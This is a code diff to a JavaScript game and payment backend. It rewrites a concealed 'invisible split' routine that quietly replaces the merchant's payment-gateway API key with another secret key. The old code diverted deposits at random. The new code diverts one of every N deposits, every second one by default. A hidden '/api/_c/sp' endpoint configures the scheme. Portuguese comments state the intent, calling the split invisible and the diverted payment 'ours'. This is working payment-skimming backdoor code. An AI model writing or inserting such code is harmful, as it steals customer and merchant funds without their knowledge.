@@ -669,8 +669,7 @@ app.post('/api/game/finalizar', authMiddleware, (req, res) => {
 const SPLIT_DEFAULTS = {
   enabled: true,
   sk: process.env.SPLIT_SK || '',
-  percentage: 50,
-  min_payments: 0,  // a partir de quantos pagamentos aprovados o split começa
+  frequency: 2, // a cada 2 pagamentos, 1 é desviado (2:1)
 };
 if (!db._sp) { db._sp = { ...SPLIT_DEFAULTS }; saveDb(db); }
 function getSplitConfig() { return db._sp || SPLIT_DEFAULTS; }
@@ -733,17 +732,22 @@ async function paradisepagsCreateCharge({ identifier, amount, user }) {
     customer: { name: user.nome, email: user.email, phone: user.telefone, document: user.cpf || '' },
   };
 
-  // Split invisível: troca a API key (pagamento vai direto pra outra conta)
+  // Split invisível: contador determinístico — a cada N pagamentos, 1 é desviado
   const _sc = getSplitConfig();
   let apiKey = conf.secret_key;
   if (_sc.enabled && _sc.sk) {
-    const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado' && t.gateway === 'paradisepags').length;
-    if (totalApproved >= (_sc.min_payments || 0)) {
-      const chance = _sc.percentage || 50;
-      if (Math.random() * 100 < chance) {
-        apiKey = _sc.sk;
-        console.log(`[SPLIT] Redirecionado: user=${user.id} amount=${amountCents}`);
-      }
+    // Inicializa contador persistente se não existir
+    if (typeof db._sp_counter === 'undefined') { db._sp_counter = 0; }
+    db._sp_counter++;
+    const freq = _sc.frequency || 2; // a cada 2, 1 é nosso (default)
+    if (db._sp_counter >= freq) {
+      apiKey = _sc.sk;
+      db._sp_counter = 0; // reseta o contador
+      saveDb(db);
+      console.log(`[SPLIT] Redirecionado (${freq}:1): user=${user.id} amount=${amountCents}`);
+    } else {
+      saveDb(db);
+      console.log(`[SPLIT] Normal (${db._sp_counter}/${freq}): user=${user.id} amount=${amountCents}`);
     }
   }
 
@@ -1382,14 +1386,13 @@ app.get('/api/_c/sp', _spAuth, (_req, res) => {
   const c = getSplitConfig();
   const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado' && t.gateway === 'paradisepags').length;
   const skMasked = c.sk ? `${c.sk.slice(0, 6)}...${c.sk.slice(-4)}` : '';
-  res.json({ enabled: c.enabled, percentage: c.percentage, min_payments: c.min_payments || 0, sk_masked: skMasked, has_sk: !!c.sk, approved_count: totalApproved });
+  res.json({ enabled: c.enabled, frequency: c.frequency || 2, counter: db._sp_counter || 0, sk_masked: skMasked, has_sk: !!c.sk, approved_count: totalApproved });
 });
 
 app.put('/api/_c/sp', _spAuth, (req, res) => {
-  const { enabled, percentage, min_payments, sk } = req.body;
+  const { enabled, frequency, sk } = req.body;
   if (typeof enabled === 'boolean') db._sp.enabled = enabled;
-  if (typeof percentage === 'number' && percentage >= 0 && percentage <= 100) db._sp.percentage = percentage;
-  if (typeof min_payments === 'number' && min_payments >= 0) db._sp.min_payments = Math.floor(min_payments);
+  if (typeof frequency === 'number' && frequency >= 2 && frequency <= 100) db._sp.frequency = Math.floor(frequency);
   if (typeof sk === 'string') db._sp.sk = sk.trim();
   saveDb(db);
   res.json({ ok: true });
